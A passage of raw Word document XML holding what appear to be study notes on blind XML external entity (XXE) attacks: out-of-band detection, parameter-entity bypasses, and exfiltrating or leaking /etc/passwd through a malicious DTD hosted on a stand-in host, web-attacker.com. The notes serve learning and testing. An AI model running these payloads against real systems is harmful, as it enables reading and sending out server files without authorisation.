          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>Content-Length: 52</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>?xml</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> version="1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>0" encoding="UTF-8"?&gt;&lt;foo&gt;bar&lt;/foo&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Blind XXE</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Detect blind XXE by:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>using out-of-band testing; or</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>triggering</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> XML parsing errors.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Out-of-band testing (OAST)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">The following will make a very specific request to a server controlled by the attacker which will be </w:t>
      </w:r>
      <w:r>
        <w:t>seen in the logs:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo [ &lt;!ENTITY </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; ]&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockCheck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;&lt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>stockCheck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>It may be possible to bypass XML parsing hardening using parameter entities as well:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo [ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">&lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://f2g9j7hhkax.web-attacker.com"&gt; %</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>; ]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Exfiltrating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> data using blind XXE</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Attacker defines a malicious DTD hosted at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>http://web-attacker.com/malicious.dtd</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!ENTITY</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> % file SYSTEM "file:///etc/passwd"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> "&lt;!ENTITY</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> &amp;#x25; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>exfiltrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM 'http://web-attacker.com/?x=%file;'&gt;"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>exfiltrate</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>They can then submit the following XML payload to a vulnerable application:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo [ &lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://web-attacker.com/malicious.dtd"&gt; %</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>; ]&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>:bulb</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:t>this type of attack may be blocked by responses that contain newline characters.  Sometimes this can be bypassed using the FTP protocol rather than HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Retrieving data via XML parsing errors</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Attacker defines a malicious DTD hosted at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>http://web-attacker.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>com/malicious.dtd</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>&lt;!ENTITY</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> % file SYSTEM "file:///etc/passwd"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">&lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>eval</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:br/>
        <w:t>%error;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Submitting the following to a vulnerable application will cause an XML error that leaks the content</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:shd w:val="solid" w:color="E2E2E2" w:fill="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;!DOCTYPE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> foo [ &lt;!ENTITY % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> SYSTEM "http://web-attacker.com/malicious.dtd"&gt; %</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>xxe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>; ]&gt;</w:t>
      </w:r>
    </w:p>
